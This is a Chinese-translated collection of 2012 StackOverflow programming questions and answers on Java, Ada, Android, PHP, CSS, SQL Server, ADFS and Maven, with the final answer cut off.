# StackOverflow 问答 13957000-13957999

# java - 在java中打印到多个输出文件

> ID：13957000
> 
> 赞同：0
> 
> 时间：2012-12-19T16:40:44.143
> 
> 标签：java

我有两个要打印到单独文件的数组。这是我的代码：

```
 try {
      PrintStream out = new PrintStream(new FileOutputStream(
          "Edges.txt"));
      for (i = 0; i < bcount; i++) {
        out.println(b[i][0] + " " + b[i][1]);
      }
      out.close();

    } catch (FileNotFoundException e) {
      e.printStackTrace();
    }

    } catch (Exception ex) {
    ex.printStackTrace();
    }

    try {
      PrintStream out = new PrintStream(new FileOutputStream(
          "Nodes.txt"));
      for (i = 0; i < bigbIter; i++) {
        out.println(bigb[i]);
      }
      out.close();

    } catch (FileNotFoundException e) {
      e.printStackTrace();
    }

    } catch (Exception ex) {
    ex.printStackTrace();
    } 
```

如果我只使用第一组try/catch/catch，就完美了。但是当我同时使用它时它不起作用，给我错误“类型的非法开始......} catch”和“错误：预期的类，接口或枚举”。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T16:41:59.040

```
} catch (FileNotFoundException e) {
  e.printStackTrace();
}

} catch (Exception ex) {
ex.printStackTrace();
} 
```

你有一个 extra `}`，它会抛出解析器并给你很多错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:45:19.573

您应该编写一个写入文件的方法。只需传递文件名和数据。你应该看到你有太多的右括号，让你的 IDE 突出显示括号。

教训就是不要复制/粘贴，然后在您再次需要时编辑 catch 块！

编辑：同样在java 7中你可以在一个块中有多个catch，最好这样做：

```
catch (FileNotFoundException | IOException e)
{
} 
```

# objective-c - 神奇的记录：总和聚合

> ID：13957004
> 
> 赞同：1
> 
> 时间：2012-12-19T16:40:49.940
> 
> 标签：objective-c, core-data, magicalrecord

我正在对实体进行聚合，代码是：

```
 NSPredicate *betweenInterval = [NSPredicate predicateWithFormat:@"(date >= %@) AND (date < %@)", [interval.start value], [interval.end value]];

 NSNumber * nbPoints = [OMSPointsEventEntity MR_aggregateOperation:@"sum:" onAttribute:@"nbPoints" withPredicate:betweenInterval];

 return [nbPoints intValue]; 
```

而 NbPoints 为零，我不知道为什么......

提示：我的实体上的属性 NbPoints 是 NSNumber 应该是 int 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T11:35:04.930

我不了解 MR，但在标准 Cord Data 中，聚合函数必须以`@`. 也许您应该在 MR 文档中查找此内容。

```
...MR_aggregateOperation:@"@sum"... // ??? 
```

如果您可以获得所有`PointsEvent`实体的数组，则可以在获取后自行计算：

```
NSNumber *sum = [fetchedObjects valueForKeyPath:@"@sum.nbPoints"]; 
```

至于属性数据类型，您的设置似乎是正确的：`int32`或类似或在您的子类`float`中的核心数据模型中。`NSNumber``NSManagedObject`

# file - 如何在 Ada 中完整快速地读取二进制文件？

> ID：13957005
> 
> 赞同：4
> 
> 时间：2012-12-19T16:40:55.027
> 
> 标签：file, io, binaryfiles, ada

我想读取几个 MB 的二进制文件的内容并将其存储到缓冲区中。这是我的函数原型（如果需要，我可以更改它）：

```
procedure GET_BIN_CONTENT_FROM_PATH(PATH    : in UNBOUNDED_STRING;
                                    CONTENT : out UNBOUNDED_STRING); 
```

到目前为止，我已经尝试了两种方法，都使用 Direct_IO 包。在第一种方法中，我是逐字符读取文件；它起作用了，但是速度非常慢。为了加快进程，我尝试按 MB 读取文件：

```
procedure GET_BIN_CONTENT_FROM_PATH (PATH    : in UNBOUNDED_STRING;
                                     CONTENT : out UNBOUNDED_STRING) is

   BIN_SIZE_LIMIT : constant NATURAL := 1000000;
   subtype FILE_STRING is STRING (1 .. BIN_SIZE_LIMIT);
   package FILE_STRING_IO is new ADA.DIRECT_IO (FILE_STRING);
   FILE : FILE_STRING_IO.FILE_TYPE;
   BUFFER : FILE_STRING;

begin
   FILE_STRING_IO.OPEN (FILE, MODE => FILE_STRING_IO.IN_FILE,
                        NAME => TO_STRING (C_BASE_DIR & PATH));
   while not FILE_STRING_IO.END_OF_FILE (FILE) loop
      FILE_STRING_IO.READ (FILE, ITEM => BUFFER);
      APPEND (CONTENT, BUFFER);
   end loop;
   FILE_STRING_IO.CLOSE (FILE);
end GET_BIN_CONTENT_FROM_PATH; 
```

不幸的是，如果文件中剩余的空间少于 1MB，则似乎不会发生 READ 操作。结果，大文件 (>1MB) 会被截断，而小文件根本不会被读取。在处理图像时尤其明显。

所以，我的问题是：快速完整地读取二进制文件的正确方法是什么？

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:00:31.027

让 Bin_Size 等于`Ada.Directories.Size(my_file)`，一口气读完。

如果它对于堆栈分配来说太大（你会得到 Storage_Error）用 New 分配它，并使用重命名技巧

```
my_image : bin_array renames my_image_ptr.all; 
```

这样就不需要知道其他任何东西了……
但是，如果它只有几 MB，那就没有必要了。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T18:15:59.910

[Ada.Streams.Stream_IO.Read](http://www.ada-auth.org/standards/12rm/html/RM-A-12-1.html#p16)读入[Stream_Element_Array](http://www.ada-auth.org/standards/12rm/html/RM-13-13-1.html#p4)并告诉您最后读取的元素；如果未填充数组（因为您已到达文件末尾），`Last`则将小于`Item'Last`.

纯粹主义者会注意到`Ada.Streams.Stream_Element'Size`可能与.`Character'Size``Stream_Element_Array``String``Content`

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-19T23:11:28.627

有许多“正确”的方法，但这里有一个您可能会喜欢的方法。尤其是在读取大文件时，读取整个文件的一种有效方法是使用`mmap`.

根据您的许可需求，您可以向第三方 GPLd 解决方案开放。AdaCore 提供了[GNATColl集合，它为](http://docs.adacore.com/gnatcoll-docs)[mmap](http://docs.adacore.com/gnatcoll-docs/mmap.html)提供了一个很好的接口。您可以映射整个文件并复制内容。

```
declare
   File : Mapped_File;
   Str  : Str_Access;
begin
   File := Open_Read ("/tmp/file_on_disk");
   Read (File);  --  read the whole file
   Str := Data (File);
   for S in 1 .. Last (File) loop
       Put (Str (S));
   end loop;
   Close (File);
end; 
```

如果您的系统不支持该`mmap`调用，则该库将退回到`read(2)`实现。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-05-21T22:09:15.850

正如其他人所提到的，Ada.Streams.Stream_IO.Read 是要走的路。这是我放在系统上的一个示例。假设您有足够的内存可用于动态分配，这能够读取大于堆栈大小的文件。

我还没有深入研究 Stream.IO.Read 代码的内部结构，但我怀疑 Stream_IO 包正在使用 4k 内存块（从堆中分配）来缓冲读取操作。

```
with Ada.Directories;  use Ada.Directories;
with Ada.Direct_IO;
with Ada.Unchecked_Deallocation;
with Ada.Streams.Stream_IO;

procedure Read_Input_File is

   type Byte is mod 2 ** 8;
   type Byte_Array is array (File_Size range <>) of Byte;
   type Byte_Array_Access is access Byte_Array;

   procedure Delete is new Ada.Unchecked_Deallocation 
                           (Byte_Array, Byte_Array_Access);

   function Read_Binary_File (Filename : String)
      return Byte_Array_Access
   is
      package SIO renames Ada.Streams.Stream_IO;

      Binary_File_Size : File_Size := Ada.Directories.Size (Filename);
      Binary_File_Data : Byte_Array_Access; 
      S                : SIO.Stream_Access;   
      File             : SIO.File_Type;

   begin
      -- Allocate memory from the heap 
      Binary_File_Data := new Byte_Array (1 .. Binary_File_Size);

      SIO.Open (File, SIO.In_File, Filename);
      S := SIO.Stream (File);

      -- Read entire file into the buffer
      Byte_Array'Read (S, Binary_File_Data.all);

      SIO.Close (File);

      return Binary_File_Data;
   end;

   File_Data : Byte_Array_Access;

begin

   File_Data := Read_Binary_File ("File_Name.bin");

   -- Do something with data

   Delete (File_Data);

end Read_Input_File; 
```

# java - Android Parcelable 类说：JavaBinder -> FAILED BINDER TRANSACTON.. (BIG-DATA)

> ID：13957006
> 
> 赞同：3
> 
> 时间：2012-12-19T16:41:01.280
> 
> 标签：java, android, decode, encode

Parcalable 类可以传递超过 40k 的数据吗？

我的 Parcalable 类如下所示：[http](http://paste.ubuntu.com/1450245/) ://paste.ubuntu.com/1450245/ （行：228 和 261）

```
 public ApplicationsModel(Parcel parcal)
    {
        this();
        this.setId(parcal.readLong());
        this.setName(parcal.readString());
        this.setKeywords(parcal.readString());
        this.setPrice(parcal.readString());
        this.setVersion(parcal.readString());
        this.setScreenshot_url(parcal.readString());

        this.setSupport_url(parcal.readString());
        this.setLicense(parcal.readString());
        this.setWebsite(parcal.readString());
        this.setArchive_root(parcal.readString());

        // end in error
        this.setDescription(parcal.readString());
    }
    public static final Parcelable.Creator<ApplicationsModel> CREATOR = new Parcelable.Creator<ApplicationsModel>() 
    {
        @Override
        public ApplicationsModel createFromParcel(Parcel source) {
            return new ApplicationsModel(source);
        }
        @Override
        public ApplicationsModel[] newArray(int size) {
            return new ApplicationsModel[size];
        }
    };
    @Override
    public void writeToParcel(Parcel dest, int flags) {
        dest.writeLong(getId());
        dest.writeString(getName());
        dest.writeString(getKeywords());
        dest.writeString(getPrice());
        dest.writeString(getVersion());
        dest.writeString(getScreenshot_url());

        dest.writeString(getSupport_url());
        dest.writeString(getLicense());
        dest.writeString(getWebsite());
        dest.writeString(getArchive_root());

        // end in error
        dest.writeString(getDescription());
    } 
```

它适用于 ID、关键字等数据。

但如果我尝试使用“描述”，它最终会出现：

> JavaBinder ！！BINDER TRANSACTON 失败！！

**像这样的*“描述”*数据：**

```
Visually create your websites by using drag & drop (WYSIWYG).\nQuick 'n Easy Web Builder is not an HTML editor, but an HTML generator! You can visually (WYSIWYG) create your websites by using drag & drop. Place objects (Text, Lines, Images, Shapes, Slideshows, Galleries, Forms etc) anywhere on the page (pixel perfect layouts). \r\nNow you can create amazing websites without having to learn HTML!\r\n\r\n- Desktop Publishing for the Web! Create websites as easy as drag and drop.\r\n- Outputs HTML4, XHTML, PHP or HTML5\r\n- Built-in support for CSS3 opacity, box-shadow, border-radius, gradients.\r\n- Site Management. Easily add, edit, clone and structure your web pages from a single file.\r\n- Easily create forms using the built-in Form Wizard or manually with a large selection of form tools\r\n- Built-in PHP form processor (send email, upload file to a folder on the server).\r\n- Built-in form validation (message box, info bubble or HTML5)\r\n- Advanced graphics tools like shapes, rotation, shadows, reflection and more than 50 other image effects.\r\n- Style manager for global styling (CSS)\r\n- Gradient Manager, create awesome multi-color gradient effects!\r\n- Publish to local drive or a FTP server using the build-in FTP manager.\r\n- Built-in Slide Shows, Photo Galleries, Rollover images, Logos etc.\r\n- Sitemap generator.\r\n- Supports JavaScript events with (optional) jQuery animations!\r\n- PayPal eCommerce Tools. \r\n- Many navigation tools available: Navigation bars, tab menus, dropdown menus, slidemenus.\r\n- More than 50 ready-to-use JavaScripts (galleries, text effects, social media etc.)\r\n- Template support. Already more than 100 templates available!\r\n- Support for YouTube, Flash Video, HTML5 Video/Audio and many other video formats.\r\n- Add external scripts and other code with the HTML object.\r\n- and much more!\r\n" 
```

那么我是否需要将“描述”数据保存到本地文件中，还是有更好/更快的方法来做到这一点？

# java - 如果服务器超时，Socket InputStream read() 是否会解除阻塞？

> ID：13957019
> 
> 赞同：4
> 
> 时间：2012-12-19T16:41:45.787
> 
> 标签：java, sockets

如果服务器没有收到完整的请求并关闭连接，我的服务器会在 45 秒后超时。我通过 a 连接到该服务器`Socket`并将我的请求写入套接字的`OutputStream`.

```
Socket socket = new Socket("myhost", myPort);
PrintWriter out = new PrintWriter(socket.getOutputStream());
out.write(properRequestMessage);
out.flush(); 
```

我在这里假设我的请求很好（遵循我的协议）。服务器应该以文件响应。我尝试从套接字输入流中读取：

```
BufferedReader response = new BufferedReader(new InputStreamReader(socket.getInputStream()));

String in;

while((in = response.readLine()) != null) {
    System.out.println(in);
} 
```

这里的`readLine()`块，我认为这是因为我的服务器认为我的请求没有正确终止，因此正在等待更多。

现在，如果 45 秒过去了，我的服务器超时，是否会`readLine()`取消阻止或等待某个`Socket`默认超时时间？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T16:46:15.050

这取决于服务器在超时时会做什么。如果它关闭连接，您将看到。如果它只是记录一条消息，您可能什么也看不到。

没有默认的读取超时。您的 readLine() 可以永远等待。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:47:41.540

如果服务器在该超时时***关闭***其套接字末端，[`readLine()`](http://docs.oracle.com/javase/1.4.2/docs/api/java/io/BufferedReader.html#readLine%28%29)则将返回`null`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:01:35.710

该`readLine()`方法将阻塞，直到它接收到输入或直到底层套接字`read()`超时结束。您没有在读取命令上设置超时，而是在它自己的套接字上设置超时。

[Socket.setSoTimeout(int ms)](http://docs.oracle.com/javase/6/docs/api/java/net/Socket.html#setSoTimeout(int))。

> 使用指定的超时启用/禁用 SO_TIMEOUT，以毫秒为单位。将此选项设置为非零超时，与此 Socket 关联的 InputStream 上的 read() 调用将仅阻塞此时间量。如果超时到期，则会引发 java.net.SocketTimeoutException，尽管 Socket 仍然有效。必须在进入阻塞操作之前启用该选项才能生效。超时必须 > 0。超时为零被解释为无限超时。

实际发生的情况还取决于服务器的操作，如果它正确关闭了套接字，则`IOException`应该由`readLine()`. 如果连接没有关闭，它将等待套接字超时。

# javascript - 需要更改背景位置 onMouseOver

> ID：13957021
> 
> 赞同：-1
> 
> 时间：2012-12-19T16:41:55.377
> 
> 标签：javascript, html, inline

```
<a href="#" onMouseOver="document.getElementById('button1Inline').style.backgroundPosition='0px -90px';">
    <img src="ads/button1.png" id="button1Inline" />
</a> 
```

button1.png 是一个 180 像素高的精灵，由两个效果部分组成。由于我无法控制的非自然力量，我必须使这项工作内联。我知道这不是最佳实践，我对自己感觉很糟糕，但现在我只需要它来工作。请和谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T16:51:36.177

一种方法是使用这样的 HTML：

```
<a href="#" id="button1"></a> 
```

你可以给它 CSS 属性，比如图像`display: block;`的`display: inline-block;`宽度和一半的高度，然后是`:hover`样式。

例如：

```
#button1 {
    display: block;
    width: 180px; /* assuming it's square */
    height: 90px;
    background: url(<path_to_images>/button1.png) top left no-repeat transparent;
    background-position: 0 0;
}
#button1:hover {
    background-position: 0 -90px;
} 
```

这样你就不需要任何 Javascript 并且没有副作用。

请记住`background-position`仅适用于具有`background-image`集合的 HTML 元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:50:53.880

尝试这样的事情。

```
<a href="#" onMouseOver="document.getElementById('button1Inline').style.backgroundPosition='-55px 0px';" onMouseOut="document.getElementById('button1Inline').style.backgroundPosition='0px 0px';">
    <div id="button1Inline" style="background-image:url(110crunchglovesi.png);width:55px;height:110px;background-position:0px 0px"
</a> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T16:52:06.643

您应该在 img 标签的 src 中放置一个空的 1px x 1px gif。“ads/button1.png”图像应作为背景图像放置在 img CSS 中。

# php - 如何将 POST 数据加载到 SimpleXML？

> ID：13957022
> 
> 赞同：3
> 
> 时间：2012-12-19T16:41:55.880
> 
> 标签：php, jquery, ajax, simplexml

我需要将来自 textarea 输入的 XML 数据发布到 PHP，以便解析它并输出一个表格。

我尝试了几种方法，但似乎都没有奏效。

目前我有这个：

```
jQuery('#btnRegistrarXML').live('click', function(){
var xml;

if (jQuery('#txtRegXML').val() == ""){
  AddMsg('You must paste XML from the excel export into the textarea.', 'error');
} else {
  jQuery.post('registrar-xml-to-table.php', {xml:escape(jQuery('#txtRegXML').val())}, function(data){
    jQuery('#regXMLasTable').empty();
    jQuery('#regXMLasTable').append(data);
  });
}

displayMsgs();
}); 
```

PHP 是：

```
$xmlraw = urldecode($_POST['xml']);

$dom = new DOMDocument;
$dom->preserveWhiteSpace = FALSE;
$dom->loadXML($xmlraw);
$dom->formatOutput = TRUE;
$xmlstr = $dom->saveXml();

$xml = simplexml_load_string($xmlstr);
echo "<p>xmlraw:</p>";
echo $xmlraw;
echo "<p>xml:</p>";
echo $xml;

foreach ($xml->document as $doc) {
  echo '<p class="alert alert-error">'.$doc->title.'</p>';
} 
```

第一个 echo $xmlraw 正在工作 - 它在一行上输出 XML 字符串 - 帖子正在正确发送数据。

第二个 echo $xml 不输出任何内容，foreach 也不输出任何内容 - PHP 中的某些内容不起作用

我也尝试将 $xmlraw 直接加载到 simplexml_load_string($xmlraw) 但它不起作用 - 我假设是因为它的格式不正确？

我用来测试的 XML 是：

```
<?xml version="1.0"?>
<document>
  <title>
    Foobar
  </title>
</document> 
```

您可以将 XML 粘贴到此 ( [http://tsdexter.com/webservice-testing/programs-list.php](http://tsdexter.com/webservice-testing/programs-list.php) ) 页面上的文本区域中，然后如果您检查 xmlraw 下的元素：您可以看到原始 xml 字符串已回显 -但是，在 xml: 下面什么都没有，foreach 也没有输出任何东西。

这是一个 jsFiddle，因此您可以看到 HTML/JS——它实际上并没有做任何事情，因为它不能 ajax 到 PHP 页面——所以我在上面包含了 PHP 版本来测试。[http://jsfiddle.net/tsdexter/EDqQB/](http://jsfiddle.net/tsdexter/EDqQB/)

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T23:26:13.890

几个问题，可能构成答案，也可能不构成答案，但需要比评论更多的空间。

1.  你为什么要`urldecode`在`$_POST`变量上运行？PHP 应该为您执行此操作，除非您在某处双重转义。
2.  为什么要加载到 DOM 中，然后再加载到 SimpleXML？我知道您说您尝试不使用，但他们在下面使用相同的 XML 解析器，因此除了引入更多混乱之外，这对您没有任何帮助。
3.  `var_dump(simplexml_load_string($rawxml))`给你什么？我的猜测是 FALSE，这意味着错误。在这种情况下，请检查您是否打开了警告 ( `error_reporting(E_ALL); ini_set('display_errors', '1');`) 并关闭了[详细的 XML 错误处理](http://php.net/manual/en/simplexml.examples-errors.php)`libxml_use_internal_errors(false);`( )。
4.  如果它确实为您提供了 SimpleXMLElement 对象，请不要花太长时间查看`var_dump`输出。请改用[其中一种调试功能](https://github.com/imsop/simplexml_debug)。

# html - 表 td 内的 100% 高度 div

> ID：13957024
> 
> 赞同：1
> 
> 时间：2012-12-19T16:42:11.067
> 
> 标签：html, html-table

我有这张桌子：

```
<table>
    <tr>
        <td>
            <div style="height: 100%">Some Content</div>
        </td>
        <td>
             Some Content<br><br><br><br>
        </td>
    </tr>
</table> 
```

`<div>`height 应该在`100%`inside `<td>`，但未`<td>`指定 height of。应该有一些简单的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:36:19.003

[JS 小提琴示例](http://jsfiddle.net/JnJmb/67/)

您可以使用：

```
<td style="vertical-align:top;">Top</td>
<td style="vertical-align:middle;">Middle</td>
<td style="vertical-align:bottom;">Bottom</td>
<td style="vertical-align:54%;">Custom</td>
// More information on: http://www.w3schools.com/cssref/pr_pos_vertical-align.asp 
```

在表格单元格上正确定位内容。但是，您仍然会遇到背景着色问题，您可能希望将任何颜色直接应用于表格单元格，如下所示：

```
<td style="background-color:yellow;"></td> 
```

表格行高的相关资料：

> 'table-row' 元素框的高度是在用户代理获得行中的所有单元格后计算的：它是该行计算的“高度”的最大值，该行中每个单元格的计算“高度”，以及单元格所需的最小高度 (MIN)。'table-row' 的 'auto' 的 'height' 值意味着用于布局的行高是 MIN。MIN 取决于单元框高度和单元框对齐方式（很像行框高度的计算）。CSS 2.1 未定义在使用百分比值指定高度时如何计算表格单元格和表格行的高度。CSS 2.1 没有定义行组中“高度”的含义。[来源 W3.org](http://www.w3.org/TR/CSS2/tables.html#height-layout)

*   我已经完成了内联 css，记得始终使用样式表分隔 css。

似乎 div 的高度仅限于单元格的高度，我们可以以像素为单位操纵单元格的高度。100% 只会给你 100% 的单元格最小高度，所以你必须以像素或某种形式的尺寸来定义它。

# ipython-notebook - 如何将文本文件上传到 ipython 笔记本

> ID：13957025
> 
> 赞同：1
> 
> 时间：2012-12-19T16:42:12.387
> 
> 标签：ipython-notebook

我想要一个完整的文件作为文本文件，而不仅仅是 IPython 笔记本中的一个单元格。

我在 IPython notebook 中写了一些代码，现在我想测试它们，所以我尝试将一些文本文件作为原始数据上传到 IPython notebook。但文件的扩展名总是“.ipynb”，文本文件的格式有已更改，因此我的代码无法正确读取。

如何将文本文件上传到 Ipython 笔记本？提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-20T15:40:07.840

你能更详细一点吗？

您是否尝试从文本文件中读取数据？在这种情况下，常规的 python 打开和读取函数可以将数据转换为变量。您甚至可以在变量中执行 Unix“cat”文件的内容：

```
 var=!cat file 
```

或者您是否尝试将 ipynb 文件中的文本作为输入单元格中的内容获取，以便您可以编辑并运行它们？ipynb 文件通常由 notebook 引擎创建，它们是 JSON 格式的。因此，如果您只是将其中的文本复制粘贴到单元格中，它们将无法按原样使用。使用一些 JSON 解析来解释它们的内容。它们不是常规的 python 代码，因此“%run file”无法让 ipython 执行它们的代码。

详细说明用例可能会帮助其他人提供解决方案......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-06-27T15:49:21.300

以下行打开一个文本文件并在 jupyter 笔记本单元格中显示内容。

```
text_file = open(full/path/to/text/file)
file_content = text_file.read()
print(file_content)
text_file.close() 
```

我希望这有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-24T01:57:41.013

可能晚了，你可以这样做

```
%%pycat full/path/to/text/file 
```

# windows - ADFS - 证书不是唯一的

> ID：13957029
> 
> 赞同：0
> 
> 时间：2012-12-19T16:42:21.307
> 
> 标签：windows, adfs, federation

我创建了几个使用 SAML2 身份验证的应用程序。这些应用程序（包括 SalesForce）通常共享相同的域（即：reports.application.com、portal.application.com 等），但不是单个应用程序的一部分，甚至不在同一个堆栈上。一些子域通向 SalesForce，一些子域通向其他应用程序。

问题是 ADFS 报告“证书不是唯一的”并拒绝允许应用程序在 ADFS 数据库中注册，因为证书相同。这对 SalesForce 来说尤其麻烦。

我不确定如何解决这个问题。

编辑：重要的是要注意几乎所有这些应用程序都是 SAML2 而不是 ADFS。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-05T03:11:27.563

此问题可以通过为 ADFS 2.0 ( [http://support.microsoft.com/kb/2790338](http://support.microsoft.com/kb/2790338) )应用汇总 3 来解决

它列出了已知问题和 Hot Fix。具体到 Salesforce ，我们得到以下问题（在 Rollup 3 中描述）；

> 一些依赖方要求将签名证书应用于 SAML 请求的依赖方，因为签名证书提供了关键的安全验证功能并且在 SAML 2.0 规范中进行了定义。AD FS 2.0 能够允许将唯一签名证书应用于依赖方信任，但它只允许将相同的证书应用于每个 AD FS 2.0 场的一个依赖方信任。此限制可防止多个依赖方对 SAML 请求使用相同的签名证书。AD FS 2.0 更新汇总 3 删除了此限制，并允许多个依赖方对 SAML 请求使用相同的签名证书。

***注意：应用更新汇总 3 后，您需要手动运行脚本（如下所述）以修复此问题。***

**窗口内部数据库：**

对于问题 3，此修补程序将名为“ `PostReleaseSchemaChanges.ps1`”的 PowerShell 脚本安装到“ `%program files%\active directory federation services\sql`”文件夹中。

如果您使用 Windows 内部数据库 (WID) 作为 AD FS 2.0 配置数据库，则在应用此修补程序后，您必须首先在场中的辅助联合服务器上手动执行 PostReleaseSchemaChanges.ps1 PowerShell 脚本，然后在主联合服务器。

**注意：您可能会遇到错误“在此系统上禁用了脚本的执行”。为了克服这个问题，您可以尝试在 powershell 中运行以下命令（适用于 Windows Server 2008 R2）：**

```
Set-ExecutionPolicy RemoteSigned 
```

如果您仍然遇到此问题，请参阅下面的 StackOverflow 帖子： [PowerShell 说“在此系统上禁用脚本执行”。](https://stackoverflow.com/questions/4037939/powershell-execution-of-scripts-is-disabled-on-this-system)

**SQL 服务器：**

如果您使用 SQL Server 数据库作为 AD FS 2.0 配置数据库，则必须下载并`RelaxedRequestSigningCertsv2.sql`针对 SQL Server 数据库执行脚本。

要执行此脚本，请使用 Sqlcmd 实用程序运行以下 cmdlet：Sqlcmd -S -i RelaxedRequestSigningCertsv2.sql 或者，按照以下步骤使用 SQL Server Management Studio 运行 cmdlet：

```
Connect to the SQL Server database that has the AD FS 2.0 configuration database.
Create a new SQL query.
Paste the contents of the RelaxedRequestSigningCertsv2.sql file into the query, and then execute the query. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T23:39:08.500

我对“重要的是要注意几乎所有这些应用程序都是 SAML2 而不是 ADFS”的说法有些困惑。您的意思是“重要的是要注意几乎所有这些应用程序都是 SAML2 而不是 WS-Fed”？

这些应用程序如何通过 ADFS 进行身份验证？你有某种第三方堆栈吗？

为什么这些应用程序有证书？是因为请求已签名还是 SLO 已签名或什么？

如果某些应用程序实际上不需要证书，您可以将其从元数据中删除。

# sql - 过程或函数“sp_***”需要未提供的参数“@”

> ID：13957030
> 
> 赞同：0
> 
> 时间：2012-12-19T16:42:28.963
> 
> 标签：sql, database, stored-procedures, sql-server-2008-r2

我正在尝试执行存储过程，但出现以下错误：

> *过程或函数“SP_DELETE_DESIGN_PARAMETERS”需要未提供的参数“@DESIGN_ID”。*

下面是我的存储过程。

我正在尝试在 SQL 中执行它需要结果在表中。

```
CREATE PROCEDURE SP_DELETE_DESIGN_PARAMETERS
    @DESIGN_ID INT
AS
BEGIN 
   Delete From Design_Parameters where Design_ID = @DESIGN_ID
END

exec SP_DELETE_DESIGN_PARAMETERS 
```

我知道我遗漏了一些非常简单的要点。我将不胜感激任何帮助。

我正在使用带有 VB.Net 的 SQL Server 2008 R2 和 VS2010

谢谢 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T16:43:31.370

```
exec SP_DELETE_DESIGN_PARAMETERS @DESIGN_ID = 5
exec SP_DELETE_DESIGN_PARAMETERS 5 
```

阅读[如何将参数传递给存储过程](http://www.devguru.com/technologies/t-sql/7132.asp)。您要求一个参数但不提供它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T16:45:14.427

当您执行您的存储过程时，您需要将它期望的@DESIGN_ID 参数传递给它。

```
EXEC SP_DELETE_DESIGN_PARAMETERS 123 
```

其中 123 是您要传递给存储过程的 ID

# maven-3 - Maven中的多个分类器

> ID：13957032
> 
> 赞同：0
> 
> 时间：2012-12-19T16:42:29.870
> 
> 标签：maven-3

作为一个 Maven 新手，我想知道是否可以同时使用多个分类器；在我的情况下，它将用于在一次运行中生成不同的罐子。我使用这个命令来构建我的项目：

```
mvn -Dclassifier=bootstrap package 
```

从逻辑上讲，我认为这是可能的：

```
mvn -Dclassifier=bootstrap,api package 
```

我正在使用 Maven 3.0.4

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:46:40.800

您的项目似乎可以重构为几个 Maven 所谓的“模块”。这涉及将代码拆分为单个目录树中的单独项目，其中最顶层通常是父或聚合器 POM，其中包含子项目目录名称`<packaging>pom</packaging>`的列表。`<modules/>`

然后，我建议将 API 接口/异常/whatnot 放入带有自己的 pom.xml 的 api/ 子目录中，并将引导类放入带有自己的 pom.xml 的 bootstrap/ 子目录中。然后顶级 pom.xml 将列出这样的模块：

```
<modules>
  <module>api</module>
  <module>bootstrap</module>
</module> 
```

一旦你重构了项目，你可能想要从 bootstrap 模块添加一个依赖到 api 模块，因为我猜 bootstrap 将依赖于接口/等。从 api。

现在，您应该能够进入目录结构的顶层并简单地调用：

```
mvn clean install 
```

这种方法很好，因为它迫使您考虑代码中如何支持不同的用例，并且它使类之间的依赖循环更难错过。

如果您想要一个示例，请查看我的一个 github 项目：[Aprox](http://github.com/jdcasey/aprox/ "Aprox Maven 存储库管理器")。

**注意：**如果您有许多模块依赖于 api 模块，您可能希望在该部分的顶级 pom.xml 中列出它`<dependencyManagement/>`，因此您可以在子模块依赖声明中省略版本（请参阅[依赖机制简介](http://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Dependency_Management "依赖机制介绍")） .

**更新：遗留注意事项**

如果您由于遗留原因等原因无法重构代码库，那么您基本上有两种选择：

1.  在一个空的多模块结构中构建一系列 pom.xml 文件，并使用 build-helper-maven-plugin 以及源包含/排除来分割代码库并将类分配给单个源树中的不同模块。

2.  也许使用像组装插件这样的插件来划分目标/类目录（`${project.build.directory}`）并将类分配给不同的 jar。在这种情况下，每个程序集描述符都需要一个`<id/>`，默认情况下，该值将成为该程序集 jar 的分类器。在这个计划下，“主要”jar 输出仍将是 Maven 构建创建的单体。如果您不想要这个，您可以使用单独执行的程序集插件，并在配置中使用`<appendAssemblyId>false</appendAssemblyId>`. 如果该程序集的输出是 jar，那么它将有效地替换 jar 插件的旧输出。如果您决定采用这种方法，您可能需要阅读程序集插件文档以尽可能多地了解不同的示例。

另外，我应该注意到，在这两种情况下，您都会被困在使用 pom 中的一组配置文件来操作生成的事物列表，以便打开/关闭构建的不同部分。我强烈建议制作默认的、不合格的构建版本，它可以生成所有内容。这使得诸如发布插件之类的东西更有可能适当地捕获您想要发布的所有内容，以及升级版本等。

当你不能一次重构代码库时，这些解决方案通常是我提倡的迁移步骤。当从诸如从单个源代码树生成多个 jar 的 Ant 构建迁移时，它们特别有用。

# windows-phone-7 - 在 WP7 UserControl 中使用 Caliburn 会引发异常

> ID：13957034
> 
> 赞同：0
> 
> 时间：2012-12-19T16:42:40.980
> 
> 标签：windows-phone-7, caliburn.micro

我正在尝试使用控件内部的 Caliburn Micro 为 Windows Phone 应用程序构建用户控件。引导程序通常设置在 App 资源中

```
 <Application.Resources>
     <local:AppBootstrapper x:Key="bootstrapper" />
  </Application.Resources> 
```

我尝试在用户控件的 Xaml 中执行此操作。

```
 <UserControl.Resources>
     <local:AppBootstrapper x:Key="bootstrapper" />
 </UserControl.Resources> 
```

但这会在加载组件时在初始化期间引发异常。LoadComponent 调用引发异常：“Microsoft.Phone.ni.dll 中出现‘System.InvalidOperationException’类型的第一次机会异常”

应该在何时何地初始化引导程序？

* * *

## 回答 #1

> 赞同：0
> 
